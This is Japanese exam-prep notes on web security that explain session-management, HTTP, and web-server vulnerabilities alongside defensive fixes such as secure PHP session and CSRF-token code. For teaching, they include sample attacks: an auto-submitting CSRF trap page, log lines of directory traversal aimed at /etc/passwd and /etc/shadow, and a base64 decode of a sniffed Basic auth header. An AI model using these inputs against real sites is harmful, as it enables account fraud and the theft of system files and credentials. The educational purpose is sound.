## 0. 全体像 ― なぜこの分野を学ぶのか

多くの組織がWebサイトをもつようになり、Webページ上でユーザからの入力を受け付けるための**Webアプリケーション**が広く利用されています。**HTTP**（HyperText Transfer Protocol）は、Webページにアクセスするためのプロトコルとして、SMTPとともに最も広く利用されているプロトコルです。現在、インターネットを使用している組織の中でWebサイトをもたないところは皆無に等しいはずです。多くの組織が独自のWebページを開発して広く一般に公開しており、その中には単なる情報発信にとどまらず、Webアプリケーションによって利用者の入力データを受け付けて処理したり、商品やサービスを販売したりしているものも珍しくありません。

第2章で見たように、近年、Webアプリケーションの脆弱性を突いた攻撃は増加し続けており、Webサーバの背後にあるデータベースから個人情報が盗まれる事件なども発生しています。2.5 ではセッションハイジャック、2.8 ではXSS・SQLインジェクション・OSコマンドインジェクション・HTTPヘッダインジェクション・メールヘッダインジェクション・ディレクトリトラバーサルを、**攻撃者が何をどう入力するか**という攻撃側の視点で学びました。本ノートでは同じ脆弱性を裏側から見て、**Webアプリケーションの開発者とWebサーバの運用者が、何を・何のために・どう作り、どう設定すべきか**に重点を置きます。前提となるHTTPの仕組み（リクエストとレスポンスの構造、GETとPOST、Referer、Cookieの属性、セッションIDの受渡し手段）は、第1章 1.4 の 7節で学んだ内容をそのまま使います。

事件の原因となっているのは、HTTPプロトコル自体の脆弱性とWebアプリケーションの脆弱性です。なかでもセッション管理の脆弱性は、HTTPの仕様、Webサーバの実装及び設定、Webアプリケーションの仕様及び実装の各要素が密接に関係しており、複雑です。そこで本ノートでは、はじめにセッション管理の脆弱性を取り上げ、続いてそれ以外の脆弱性を取り上げます。

1. **Webサイトの脆弱性の4分類**：どの脆弱性を、誰が、どの手段で見つけて直すのかを整理します（1節）。
2. **セッション管理の脆弱性と対策**、およびコラムとして**CSRF**（2節）。
3. **HTTP（プロトコル）の仕様による脆弱性と対策**（3節）。
4. **Webサーバ（OS／ミドルウェア）の実装や設定の不備**（4節）。
5. **Webアプリケーションの仕様や実装による脆弱性**：脆弱なコードと安全なコードを並べて比較します（5節）。
6. **主なプロトコルの脆弱性と対策の一覧**：3.3〜3.6 で扱ったプロトコルの脆弱性をまとめます（6節）。

科目Bの業務観点では、主に「②情報システムの企画・設計・開発・運用におけるセキュリティ確保」（セキュリティ機能の設計・実装、セキュアプログラミング、脆弱性診断）に対応し、Webサーバの設定・運用の面では「③利用におけるセキュリティ対策の適用」（脆弱性への対応、ログの分析）にもかかわります。科目A-2ではCookieの属性、CSRF対策とXSS対策の識別、プレースホルダの効果が頻出で、科目Bではソースコードやログ、HTTPヘッダを読ませて「どこに脆弱性があり、どう修正すべきか」を記述させる設問が毎回のように出題されています。

## 1. Webサイトの脆弱性の4分類と対処方法

### 1.1 4つの分類

Webサイトの脆弱性は、次の4つに分類できます。

1. セッション管理の脆弱性
2. HTTP（プロトコル）の仕様による脆弱性
3. Webサーバ（OS／ミドルウェア）の実装面の脆弱性及び設定不備
4. Webアプリケーションの実装面の脆弱性

**図：Webサイトの脆弱性と対処方法**

| 脆弱性の分類 | 性質 | 主な対処方法 | 誰が対処するか |
|---|---|---|---|
| ①セッション管理の脆弱性 | Webアプリケーション固有 | 本番運用前の脆弱性診断と確実な改修 | 開発者（発注者は診断を要件に含める） |
| ②HTTP（プロトコル）の仕様による脆弱性 | プロトコル自体の問題 | HTTPS（TLS）の利用、適切な認証方式の採用 | 設計者・運用者 |
| ③Webサーバ（OS／ミドルウェア）の実装面の脆弱性 | 製品共通 | 脆弱性情報の随時確認と修正プログラム（パッチ）の適用 | 運用者 |
| ③Webサーバ（OS／ミドルウェア）の設定不備 | 運用・設定の問題 | 脆弱性診断による発見と設定の修正 | 運用者 |
| ④Webアプリケーションの実装面の脆弱性 | Webアプリケーション固有 | 本番運用前の脆弱性診断と確実な改修 | 開発者（発注者は診断を要件に含める） |

### 1.2 分類によって「気づき方」が違う

この分類が大切なのは、分類によって脆弱性に**気づく手段**が違うからです。

③のWebサーバ（OS／ミドルウェア）の実装面の脆弱性は、製品の脆弱性なので、世界中の利用者に共通です。ベンダーやJVN（Japan Vulnerability Notes）が脆弱性情報を公表するため、Webサーバの運用者は、ソフトウェアの脆弱性情報を随時確認し、ベンダーから提供される修正プログラム（パッチ）を適用することで対処します。また、設定不備については、運用者が脆弱性診断で発見し、対処する必要があります。

一方、①と④はWebアプリケーション固有の脆弱性です。自社のために作ったプログラムの欠陥なので、誰も脆弱性情報を公表してくれません。存在に気付かなければいつまでたっても改修されることはなく、その結果、重大な脆弱性を内在したままでサイトが公開され、サイバー攻撃によって大きな被害を受ける可能性があります。したがって、Webアプリケーションの開発者（および開発を発注する組織）は、新規開発したWebアプリケーションを本番運用する前に**脆弱性診断**を実施し、見つかった脆弱性を確実に改修すべきです（脆弱性診断の手法は第5章 5.3、開発工程での作り込み防止は第8章）。

## 2. セッション管理の脆弱性と対策

### 2.1 なぜセッション管理が必要か

1.4 の 7節で述べたように、HTTPでは、URL指定によるWebページの閲覧や、リンクをクリックすることによる別ページへの遷移、ログイン処理の実行などの各リクエストが単発で完結するため、その連続性や状態を管理することができません（**ステートレス**）。そのため、Webアプリケーション側で各セッションを管理するための識別情報（**セッションID**等）を生成し、クライアントとやり取りする必要があります。

セッションIDは、Webアプリケーションにとって「このリクエストはログイン済みの taro さんからのものだ」と判断する唯一の根拠です。つまり、セッションIDを攻撃者に知られることは、パスワードを知られることとほぼ同じ意味をもちます。2.5 で学んだセッションハイジャックは、まさにこのセッションIDを盗む・推測する・固定させる攻撃でした。開発者は「セッションIDを、漏らさない・推測させない・押し付けさせない・使い回させない」ことを設計の目標にします。

セッションIDの受渡し手段には、1.4 の 7.8 で見たとおり**クエリストリング**、**hiddenフィールド**、**Cookie**の3つがあり、それぞれ漏えいの経路が異なります。

### 2.2 セッション管理の9つの脆弱性

セッション管理の脆弱性には、次のようなものがあります。攻撃者から見たときにどう見えるかを添えて確認します。

**① パケット盗聴によってセッション管理情報が盗まれる可能性がある（HTTPの場合）**

クエリストリング、hiddenフィールド、Cookieのいずれの手段を用いても、HTTPで通信していれば盗聴される可能性があります。盗聴者は、経路上で次のような平文のリクエストを見るだけでセッションIDを入手できます。

```
GET /mypage HTTP/1.1
Host: shop.example.jp
Cookie: SESSID=q8Zr2Lk0vN5xT1mA          ← 平文のまま流れている
```

**② セッションIDが推測・改ざんされ、他者に情報等が漏えいする可能性がある**

セッションIDに単純な文字列（連番や日時、ユーザIDなど）を使用していると、たとえHTTPSを使用している場合であっても、セッションIDが推測・改ざんされてしまう可能性があります。HTTPSは経路上の盗聴を防ぐだけで、「値そのものが推測しやすい」問題は解決しないからです。

```
Set-Cookie: SESSID=20260930101512-0042     ← 日時＋連番：前後の値を試せば他人のセッションに当たる
Set-Cookie: SESSID=user_taro                ← ユーザID：user_hanako に書き換えればなりすませる
```

**③ 詳細なセッション管理情報をWebサーバとクライアント間でやり取りしていることにより、他者に情報等が漏えいする可能性がある**

GETメソッドでクエリストリングを使用して詳細なセッション管理情報をやり取りしているような場合には、特に危険です。

```
https://shop.example.jp/cart?sid=q8Zr2Lk0&user=taro&role=member&point=1200
                                           ↑ 本来サーバ側で保持すべき情報まで URL に載っている
```

**④ Refererのログから他のWebサイト管理者にセッション管理情報が漏えいする可能性がある**

GETメソッドでクエリストリングにセッション管理情報をセットしている場合、利用者がページ内の外部サイトへのリンクをクリックすると、セッション管理情報を含むURLが**Referer**ヘッダとしてリンク先に送出され、リンク先のWebサーバのログに記録されてしまいます。リンク先（外部サイト）のアクセスログには、次のような行が残ります。

```
198.51.100.23 - - [30/Sep/2026:10:21:07 +0900] "GET /campaign HTTP/1.1" 200 5120 "https://shop.example.jp/mypage?sid=q8Zr2Lk0vN5xT1mA" "Mozilla/5.0 ..."
                                                                                  ↑ Referer：外部サイトの管理者がセッションIDを入手できる
```

なお、POSTメソッドでデータを送信した場合、データはリクエストボディに格納されるため、URLに含まれず、Refererによる漏えいは発生しません。

**⑤ hiddenフィールドの値が改ざんされ、不正な処理が実行される可能性がある**

**hiddenフィールド**は、ブラウザの画面上には表示されないHTMLの入力フィールド（隠しフィールド）で、`<input type="hidden">` で記述され、画面間でのデータの受け渡しや計算結果の保持などに使用されます。hiddenフィールドはブラウザの画面上に表示されないため、利用者から見えず安全であると考えられている場合がありますが、HTMLを保存することによって内容を改ざんすることは容易です（現在はブラウザの開発者ツールで、その場で書き換えることもできます）。そのため、hiddenフィールドの値が改ざんされ、不正な処理が実行されてしまう可能性があります。

```html
<!-- サーバが返した注文確認画面 -->
<form action="/order/confirm" method="POST">
  <input type="hidden" name="item_id" value="A-1001">
  <input type="hidden" name="price"   value="19800">   <!-- 攻撃者が 1 に書き換えて送信する -->
</form>
```

**⑥ XSSの脆弱性により、Cookieにセットされたセッション管理情報が盗まれ、悪用される可能性がある**

**XSS**（クロスサイトスクリプティング：Cross-Site Scripting）は、ユーザの入力データをそのまま出力するWebアプリケーションの脆弱性を突いて、Webページを操作したり、Cookie等に存在するセッション情報を盗んだりするために、ユーザのPC上で不正なスクリプトを実行させる攻撃です。**反射型XSS**、**格納型（持続型）XSS**、**DOM-based XSS**の3種類に分類されます（2.8.2 で詳しく学びました）。スクリプトからCookieを読める状態だと、攻撃者は `document.cookie` の値を自分のサーバに送らせることで、セッションIDを盗み出します。

**⑦ Cookieの属性設定の問題により、Cookieにセットされたセッション管理情報が盗まれ、悪用される可能性がある**

- **secure属性**が設定されていないとHTTP通信でもCookieが送出され、盗聴される危険性が高まる
- **有効期限**が必要以上に長く設定されていると、クライアント側の問題（共用PC、端末の紛失・マルウェア感染など）によってCookieが悪用される危険性が高まる
- **有効範囲**（**Domain属性**、**Path属性**）の設定が適切でないと、関係のないサーバやディレクトリにアクセスする際にもCookieが送出され、悪用される危険性が高まる

```
Set-Cookie: SESSID=q8Zr2Lk0vN5xT1mA; Domain=example.jp; Path=/; Expires=Fri, 31 Dec 2027 23:59:59 GMT
            ↑ Secure なし（HTTPでも送られる）、HttpOnly なし（スクリプトで読める）、
              Domain 指定で blog.example.jp など他のサーバにも送られる、1年以上有効
```

**⑧ Webサーバで「URL Rewriting機能」が有効になっていると、意図的なセッション管理情報をクエリストリングにセットして使用することができる可能性がある**

- Cookieにセットされたセッション管理情報をクエリストリングとして送ることができる可能性がある
- この脆弱性により、**セッションフィクセーション**が行われる可能性がある

URL Rewriting機能は、Cookieを使えないブラウザのために、セッションIDをURLに埋め込んで引き継ぐ機能です（例：`https://shop.example.jp/login;jsessionid=ATTACKER123`）。この機能が有効だと、攻撃者は自分が用意したセッションIDをURLに埋め込んで利用者に渡せます。

セッションフィクセーションは、Webアプリケーションのセッション管理メカニズムにおけるセッションハイジャックの手法の一つで、「**セッションIDの固定化**」とも呼ばれます。攻撃者はセッションをハイジャックするために、ターゲットユーザに攻撃者が生成した（既知の）セッションIDを含む不正なURLをクリックさせ、そのセッションIDでログインさせることで、意図的にセッションを乗っ取ります。ログインの前後でセッションIDが変わらないWebアプリケーションでは、利用者がログインした瞬間に、攻撃者の手元にある同じセッションIDも「ログイン済み」になってしまいます。

**⑨ セッション管理のバグにより、本来は認証を必要とするWebページに認証プロセスを経ることなくアクセスされる**

セッション管理にバグがあると、URLの直接指定や、検索エンジンからの参照によって、本来は認証を必要とするページに直接アクセスされてしまう可能性があります。たとえば、ログイン画面では認証を確認しているのに、その先の `/member/profile?id=1024` ではセッションの有無を確認していない、という実装です。攻撃者はURLを直接入力するだけで、他人の会員情報を閲覧できてしまいます。

### 2.3 セッション管理の脆弱性への対策

Webアプリケーションの開発者とWebサーバの運用者は、セッション管理の脆弱性に対して、次のような対策を講じます。どの脆弱性（①〜⑨）に効くかを対応づけて整理します。

| 対策 | 防ぐ脆弱性 | なぜ有効か |
|---|---|---|
| 重要な情報を取り扱うWebページでは、**HTTPS**（TLS）を使用して通信を暗号化する | ① | 経路上でセッションIDを読めなくする |
| セッション管理情報には、セッションの識別情報（ID）しか含めないようにする | ③ | 詳細な情報はサーバ側に置き、漏れても意味のない値にする |
| セッションIDには十分な長さをもった乱数やハッシュ値を用いる（GETメソッドを使用している場合は特に重要） | ② | 推測できない値にする |
| 重要な情報を取り扱うWebページでは、**POSTメソッド**を用いてセッション管理情報を隠蔽し、GETメソッドではデータを渡せないようにする | ③④ | URL・アクセスログ・Refererに残さない |
| hiddenフィールドには重要な情報をセットせず、受け取った値はWebアプリケーション側で必ず検証する | ⑤ | クライアントから届く値はすべて改ざんされうる前提に立つ |
| Cookieの有効期限は可能な限り短く、有効範囲は可能な限り狭く設定する | ⑦ | 悪用できる期間と送信先を減らす |
| HTTPSでアクセスするWebページでは、必ずCookieを「**secure属性あり**」に設定する | ①⑦ | HTTP通信でCookieを送らせない |
| 入力データに含まれるメタキャラクタのエスケープ処理を確実に行い、XSSの脆弱性を残さない（Cookieに **HttpOnly属性**を設定し、スクリプトからのCookieの読出しを防ぐことも有効） | ⑥ | スクリプトを実行させない／実行されてもCookieを読ませない |
| Webサーバの「URL Rewriting機能」を無効に設定する | ⑧ | URLでセッションIDを押し付けさせない |
| ログイン成功時には新たなセッションIDを発行し直し、セッションフィクセーションを防ぐ | ⑧ | 攻撃者が事前に知っているIDを無効にする |
| 認証を必要とするページが直接アクセスされることがないようセッション管理を確実に行うとともに、そのようなページが検索エンジンやキャッシュに登録されないよう設定する（`<meta>`タグを用いて設定する） | ⑨ | すべてのページで認証状態を確認し、検索結果にも残さない |

いくつかの対策には、実装上の注意があります。

**POSTメソッドとログ**：POSTメソッドではWebサーバのアクセスログに入力データが記録されないため、SQLインジェクションやXSSなどによる侵害が発生した際には、原因究明や追跡が困難になる可能性があります。そのため、POSTメソッドを使用する場合には、Webアプリケーション側で受け取ったデータの内容をロギングするようにするのが望ましいとされます（ただし、パスワードやカード番号などをそのままログに残すと新たな漏えい源になるため、開発者は記録する項目を選び、必要に応じてマスキングすべきです）。

**セッションIDの生成方法**：「乱数やハッシュ値」とされていますが、ユーザIDや日時など推測可能な値をハッシュ化しただけでは、攻撃者も同じ計算ができるため推測を防げません。開発者は、暗号論的に安全な疑似乱数生成器で作られた値を使うべきであり、実際には自作せず、フレームワークやアプリケーションサーバのセッション管理機能に任せるのが安全です。

**HTTPとHTTPSをまたがるセッション管理**：以前は、HTTPでアクセスするWebページとHTTPSでアクセスするWebページをまたがってセッション管理を行う必要がある場合は、二つのCookieを発行し、一方を「secure属性なし」にしてHTTPのページで使用し、もう一方を「secure属性あり」にしてHTTPSのページで使用する、という方法が推奨されていました。現在は、サイト全体をHTTPSにする（常時HTTPS化）のが標準であり、さらに **Strict-Transport-Security**（HSTS）ヘッダでブラウザにHTTPでの接続そのものをさせないようにするのが推奨されます。

**検索エンジン・キャッシュへの登録防止**：`<meta name="robots" content="noindex">` で検索エンジンへの登録を防ぎ、`Cache-Control: no-store` ヘッダでブラウザやプロキシのキャッシュに内容を残さないようにします（1.4 の 7.4）。

開発者がこれらの対策を実装すると、ログイン処理とCookieの発行はたとえば次のようになります（PHPの例）。

```php
// ログイン処理（安全な例）
ini_set('session.use_only_cookies', '1');   // セッションIDをURLで受け付けない（⑧：URL Rewriting相当の無効化）
ini_set('session.use_strict_mode', '1');    // サーバが発行していない未知のIDを受け付けない（⑧）
session_set_cookie_params([
    'lifetime' => 0,                        // ブラウザを閉じたら消えるセッションCookie（⑦：有効期限）
    'path'     => '/',
    'secure'   => true,                     // HTTPSのときだけ送る（①⑦）
    'httponly' => true,                     // スクリプトから読ませない（⑥）
    'samesite' => 'Lax',                    // 他サイトからのPOSTで送らない（CSRF対策。本ノート 2.4）
]);                                         // Domain は指定しない（⑦：発行したホストだけに送る）
session_start();

if (password_verify($_POST['password'], $user['password_hash'])) {
    session_regenerate_id(true);            // ログイン成功時にセッションIDを発行し直し、古いIDを破棄する（⑧）
    $_SESSION['user_id'] = $user['id'];     // 詳細な情報はサーバ側のセッションに置く（③）
}
```

このとき、レスポンスの Set-Cookie ヘッダは次のように見えます。⑦の悪い例と見比べてください。

```
Set-Cookie: PHPSESSID=f3Kq9vX2mL7pR0tZ8wB4nC6yD1sH5jA; path=/; secure; HttpOnly; SameSite=Lax
            ↑ 推測困難な長い乱数、Domain なし、Expires なし、Secure・HttpOnly・SameSite あり
```

> **試験での出題傾向**
> セッション管理の脆弱性やその対策、Cookieの属性の役割、XSSやセッションフィクセーションなどのWebアプリケーションの脆弱性は、情報処理安全確保支援士試験（旧 情報セキュリティスペシャリスト試験）の午前・午後問題（現在の科目A-2・科目B）で繰り返し出題されています。

> **WAFの限界**
> **WAF**（Web Application Firewall）はXSSやSQLインジェクションなどのパターン化しやすい攻撃の検知・遮断には有効ですが、実際にはWAFでセッション管理の不備や画面遷移の不正といったロジック系の攻撃を防ぐのは困難です。WAFは「リクエストの文字列が攻撃らしいか」を見る装置であり、`/member/profile?id=1025` のような正常な形のリクエストが「この利用者に許されたものか」は判断できないからです。そのため、Webアプリケーション自体の改修が基本となります（WAFの詳細は第5章 5.8）。

### 2.4 コラム：クロスサイトリクエストフォージェリ（Cross-Site Request Forgery：CSRF）

**CSRF**とは、Webアプリケーションのユーザ認証やセッション管理の不備を突いて、利用者に、Webアプリケーションに対する不正な処理要求を行わせる手法です。

例えば、本来、次のような画面遷移を経て商品の購入処理が実行されるECサイトを想定します。

1. (a) ユーザ認証
2. (b) 商品の選択
3. (c) 商品の注文
4. (d) 注文内容の確認
5. (e) 注文の確定

このサイトのWebアプリケーションにCSRFの脆弱性があった場合、当該サイトの利用者が、ログイン状態を保持したまま外部のWebサイトに置かれた(e)への不正なリンクをクリックすることにより、意図しない商品を注文させられてしまう可能性があります。ブラウザは、リクエストがどのサイトのページから送られたかにかかわらず、ECサイト宛てのリクエストにECサイトのCookie（セッションID）を自動的に付けて送るため、Webアプリケーションからは正規の利用者の操作と区別がつかないのです。攻撃者が外部サイトに置く罠のページは、たとえば次のような見た目です（2.8 で見た攻撃文字列と違い、中身は「正規の形式のリクエスト」そのものである点に注目してください）。

```html
<!-- 攻撃者のサイト https://trap.example.com/ に置かれた罠ページ（概略） -->
<form action="https://shop.example.jp/order/commit" method="POST">
  <input type="hidden" name="item_id" value="B-9999">
  <input type="hidden" name="qty"     value="10">
</form>
<script>document.forms[0].submit();</script>   <!-- 開いただけで (e) 注文の確定 が送信される -->
```

この例のほか、CSRFにより、パスワードを強制的に変更させられる、サービスから強制的に退会させられる、ブログや掲示板に意図しないメッセージを書き込まされる、などの問題が発生する可能性があります。

**CSRFの対策**

CSRFによる被害を防ぐためには、Webアプリケーションの開発者がユーザ認証機能やセッション管理機能を強化し、不正なリクエストを受け付けないようにする必要があります。発想はどれも「そのリクエストが、正規の画面を経て、本人の意思で送られたものか」をサーバ側で確かめることです。具体的には、次のようなものがあります。

- **CookieのSameSite属性でStrictかLaxを指定する**
  SameSite属性によって異なるサイト間でのCookieの送信を制限し、CSRFを防ぐことが可能となります（SameSite属性については 1.4 の 7.7 を参照）。上の罠ページからのPOSTには、Lax以上ならセッションCookieが付かないため、ECサイトは未ログインのリクエストとして扱います。

- **POSTメソッドを使用し、hiddenフィールドにランダムな値をセットする**
  注文確定前の確認画面（前述の例では(d)）をクライアントに送る際に、乱数によって算出したランダムな値（「**CSRFトークン**」と呼ばれる）をhiddenフィールドにセットするようにします。クライアントから注文確定のリクエストがあった場合、リクエストに含まれるCSRFトークンをチェックし、正しい場合にのみ処理を実行します。これにより、正規の画面を経ていない注文確定のリクエストを排除することが可能となります。攻撃者は利用者のセッションに対応するトークンを知らないため、罠ページに正しい値を書けないからです。なお、Refererログや盗聴によってセットした値が漏えいしないように、この一連の処理にはHTTPSを使用する必要があります。

  ```php
  // (d) 確認画面：セッションごとの推測困難なトークンを発行して埋め込む
  $_SESSION['csrf_token'] ??= bin2hex(random_bytes(32));
  echo '<input type="hidden" name="csrf_token" value="' . htmlspecialchars($_SESSION['csrf_token'], ENT_QUOTES, 'UTF-8') . '">';

  // (e) 確定処理：トークンが一致しなければ処理しない
  if (!hash_equals($_SESSION['csrf_token'] ?? '', $_POST['csrf_token'] ?? '')) {
      http_response_code(403);
      exit('不正なリクエストです');
  }
  ```

- **確定処理の直前で再度パスワードを入力させる**
  前述の例では、(d)の画面で利用者に再度パスワードの入力を求め、入力されたパスワードが正しい場合のみ処理を実行するようにします。これにより、パスワード入力のない注文確定のリクエストを排除することが可能となります。なお、この対策は比較的実装が容易である反面、利用者の負担を増やすことになるという問題があります。

- **Refererを用いてリンク元の正当性を確認する**
  前述の例では、(e)のリクエストのReferer情報を確認することで、外部サイトから送られてきた注文確定のリクエストを排除することが可能となります。ただし、利用者がブラウザやプロキシの設定などでReferer情報を送付しないようにしている場合には、正当なリクエストであっても排除されてしまうことになります。現在のブラウザがPOST時に付ける **Origin** ヘッダ（送信元のオリジンだけを示すヘッダ）も、同じ目的で確認に使えます。

- **重要な操作を行った後で、その内容を登録アドレスにメール送信する**
  CSRFの被害を防ぐことにはなりませんが、攻撃があった事実を利用者に気付かせることができます（1.2 の4機能でいえば「検知」にあたります）。ただし、メールの本文に重要な情報を入れないようにする等の注意が必要です。

> **CSRFとXSSの違い**
> XSSは利用者のブラウザ上で不正なスクリプトを実行させる攻撃であるのに対し、CSRFは利用者のログイン状態（セッション）を悪用して、正規の利用者になりすましたリクエストをWebアプリケーションに送信させる攻撃です。XSSの対策（出力時のエスケープ）は「送られてきた文字列を無害化する」ものなので、中身が正規の形式であるCSRFのリクエストには効きません。この違いは、本ノート 7.2 の過去問題でそのまま問われています。

| 観点 | XSS | CSRF |
|---|---|---|
| 攻撃者が実行させるもの | 利用者のブラウザ上のスクリプト | 利用者のブラウザからWebアプリケーションへの正規形式のリクエスト |
| 悪用するもの | 入力をそのまま出力する実装 | Cookieが自動送信されることと、リクエストの出所を確認しない実装 |
| 典型的な被害 | Cookieの窃取、画面の改ざん、フィッシング | 意図しない注文・送金・パスワード変更・書き込み |
| 主な対策 | 出力時のエスケープ、HttpOnly属性、CSP | CSRFトークン、SameSite属性、再認証、Referer／Originの確認 |

## 3. HTTP（プロトコル）の仕様による脆弱性と対策

### 3.1 HTTP（プロトコル）の仕様による脆弱性

**① HTTPでは通信データが平文でネットワーク中を流れるため、パケット盗聴によって重要な情報が盗まれたり、改ざんされたりする可能性がある**

HTTPには暗号化の仕組みがありません。1.4 の 7.1 で見たPOSTリクエストのボディ `user=taro&pass=secret123` は、HTTPであれば経路上の誰にでも読め、書き換えることもできます。機密性と完全性の両方が損なわれます。

**② ベーシック認証の脆弱性により、パケット盗聴によって認証情報が盗まれる危険性が高い**

- HTTPの基本機能である**ベーシック認証**では、入力された認証情報（ユーザIDとパスワード）が**BASE64**エンコードされ、ネットワーク中を流れる
- BASE64はバイナリデータをテキストデータに変換する方式であり、暗号化ではないため、エンコードされたデータを復元（デコード）することは容易である
- ベーシック認証では、HTTPリクエストのたびに認証情報が送出される
- 上記の理由から、HTTPでベーシック認証を行っている場合には、パケット盗聴によって認証情報を盗むことは容易である

盗聴者が見るリクエストと、それをデコードした結果は次のとおりです。鍵も計算も要らず、コマンド1行で元に戻ります。

```
GET /admin/ HTTP/1.1
Host: www.example.jp
Authorization: Basic dGFybzpzZWNyZXQxMjM=

$ echo 'dGFybzpzZWNyZXQxMjM=' | base64 -d
taro:secret123                              ← ユーザID:パスワード がそのまま出てくる
```

**BASE64**は、3バイト（24ビット）のデータを6ビットずつ4文字の英数字・記号（A〜Z、a〜z、0〜9、+、/）に変換するエンコード方式です。電子メールの添付ファイル（MIME）などでも用いられます。鍵を用いない単なる変換であるため、機密性の確保には利用できません。

**③ ベーシック認証では、Webサーバで認証情報を管理する必要があるため、漏えいなどの危険性が高まる**

- 認証情報の一元管理ができず、管理が煩雑になる（Webサーバごとにパスワードファイルを置くことになる）
- 上記により、漏えいの危険性も高まる

### 3.2 HTTP（プロトコル）の仕様による脆弱性への対策

Webサイトの設計者と運用者は、次の対策を講じます。

- 重要な情報を取り扱うWebページではHTTPS（TLS）によって通信する
- HTTPのベーシック認証は極力使用せず、認証用の入力フォームを用いる（**フォーム認証**）か、チャレンジレスポンス方式とMD5の採用によって認証情報が秘匿化される**HTTPダイジェスト認証**を用いる
- 認証を行う画面では必ずHTTPSを使用する

**HTTPダイジェスト認証**は、サーバから送られるチャレンジ（**nonce**）とパスワードなどからハッシュ値を計算して送信する認証方式です。パスワードそのものはネットワーク上を流れません。

```
（サーバ → クライアント）
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Digest realm="admin@example.jp", qop="auth", nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093"

（クライアント → サーバ）
Authorization: Digest username="taro", realm="admin@example.jp", nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093",
               uri="/admin/", qop=auth, nc=00000001, cnonce="0a4f113b", response="6629fae49393a05397450978507c4ef1"
                                                                                  ↑ パスワードとnonceなどから計算したハッシュ値
```

ただし、MD5は現在では安全性が低下したハッシュ関数とされており、また通信内容自体は暗号化されないため、HTTPSとの併用が望ましいとされます。現在の実務では、「HTTPSの上でフォーム認証を行い、以後はセッションIDで状態を管理する」形が標準であり、ベーシック認証・ダイジェスト認証は、HTTPSを前提にした管理画面や一時的な閲覧制限などに限って使われます。

## 4. Webサーバの実装や設定の不備による脆弱性と対策

### 4.1 Webサーバの実装や設定の不備による脆弱性

セッション管理に関する脆弱性以外で、Webサーバの実装や設定の不備による脆弱性を次に示します。いずれも、Webアプリケーションのコードを直さなくても、Webサーバの運用者が設定とパッチで塞げるものです。

**① ディレクトリに関する設定不備により、ディレクトリトラバーサル攻撃を受けたり、ディレクトリ参照によって機密情報にアクセスされたりする可能性がある**

次のような脆弱性があると、URLの直接指定や検索エンジンからの参照によって、機密情報にアクセスされる可能性があります（本ノート 2.2 の⑨と同様）。

- ディレクトリのアクセス権の設定不備
- ディレクトリ参照（**ディレクトリリスティング**）が許可されている
- デフォルトページ（`index.html` など）が置かれていない

デフォルトページのないディレクトリでディレクトリ参照が許可されていると、利用者（と攻撃者）のブラウザには次のような一覧が表示されます。運用者が置き忘れたバックアップファイルが、誰でもダウンロードできる状態です。

```
Index of /backup

  Name                    Last modified      Size
  Parent Directory                             -
  customer_20260901.csv   2026-09-01 02:00   3.2M
  db_dump.sql.gz          2026-09-01 02:05    41M
```

**ディレクトリトラバーサル**は、ファイル名を指定するパラメータに「`../`」などの相対パス表記を混入させ、Webサーバ上の公開ディレクトリ外にあるファイルへ不正にアクセスする攻撃手法です（2.8.7 で解説）。アクセスログには次のような痕跡が残ります。

```
203.0.113.77 - - [30/Sep/2026:11:02:45 +0900] "GET /download?file=../../../../etc/passwd HTTP/1.1" 200 1843 "-" "curl/8.5.0"
203.0.113.77 - - [30/Sep/2026:11:02:46 +0900] "GET /download?file=..%2f..%2f..%2f..%2fetc%2fshadow HTTP/1.1" 403 199 "-" "curl/8.5.0"
                                                                  ↑ URLエンコードで検査をすり抜けようとする試行（1.4 の 7.5）
```

1行目がステータス200で相当のサイズを返していれば、攻撃が成功した可能性が高いと判断できます。

**② エラーメッセージの出力設定不備により、機密情報が漏えいする可能性がある**

Webサーバが詳細なエラーメッセージをクライアントに返す設定になっていると、ディレクトリ構成、ソフトウェアのバージョン、データベースの構造など、攻撃の手掛かりとなる情報の漏えいにつながる可能性があります。攻撃者が検索欄に `'` を1文字入力しただけで、次のような画面が返る状態です。

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064
You have an error in your SQL syntax; ... near ''' at line 1
in /var/www/shop/app/search.php:42          ← 設置ディレクトリ、SQL文の組み立て方、DB製品がわかる
```

攻撃者は、このメッセージからSQLインジェクションが通用することと、テーブル構造を推測する手掛かりを得ます。

**③ HTTPのヘッダ情報からWebサーバプログラムの種類やバージョン情報が知られてしまう可能性がある**

デフォルト設定では、Webサーバプログラムの名前やバージョン情報などをHTTPヘッダ（`Server` ヘッダなど）にセットして送出するようになっています。そのため、ポートスキャンなどによって、それらの情報が知られてしまうことになります。

```
$ curl -I https://www.example.jp/
HTTP/1.1 200 OK
Server: Apache/2.4.29 (Ubuntu)              ← 製品名・版・OSまで伝わる
X-Powered-By: PHP/7.2.24-0ubuntu0.18.04.17  ← アプリケーションの実行環境の版も伝わる
```

**④ Webサーバプログラムの種類、バージョンによってBOF攻撃を受ける脆弱性がある**

使用しているWebサーバプログラムの特定のバージョンに**バッファオーバフロー**（**BOF**：Buffer Overflow）の脆弱性が存在する場合、③で得られた情報を基に攻撃を受け、任意のコードを実行されたり、サービスを停止させられたりする可能性があります。BOF攻撃は、プログラムが確保したバッファ領域を超えるサイズのデータを送り込み、隣接するメモリ領域を上書きすることで、不正なコードの実行やプログラムの異常終了を引き起こす攻撃手法です（第2章 2.3 で解説）。

**⑤ コマンドやメソッドの設定不備により、コンテンツの改ざんや管理情報の漏えい等につながる可能性がある**

次のような問題が想定されます。

- **PUTメソッド**（WebサーバにHTMLなどのコンテンツをアップロードする機能）が使用可能になっていると、不正なコンテンツが書き込まれる可能性がある。
- **TRACEメソッド**（クライアントがWebサーバに送信した内容を、HTTPヘッダも含めてそのまま返す機能）が使用可能であり、かつクロスサイトスクリプティングの脆弱性があると、HTTPヘッダに含まれるCookieや認証情報が取得されてしまう可能性がある。
- Webサーバの**管理者用に用意されたコマンド**が有効になっている、あるいは適切な制限がかけられていないため、Webサーバのアクセスログや利用状況などが不正に閲覧される可能性がある（例：Apacheの `/server-status` が外部から見える）。

運用者は、OPTIONSメソッドへの応答で、どのメソッドが許可されているかを確認できます。

```
$ curl -i -X OPTIONS https://www.example.jp/
HTTP/1.1 200 OK
Allow: GET, HEAD, POST, OPTIONS, PUT, DELETE, TRACE    ← PUT・DELETE・TRACE が許可されている＝設定の見直しが必要
```

> **クロスサイトトレーシング（XST：Cross-Site Tracing）**
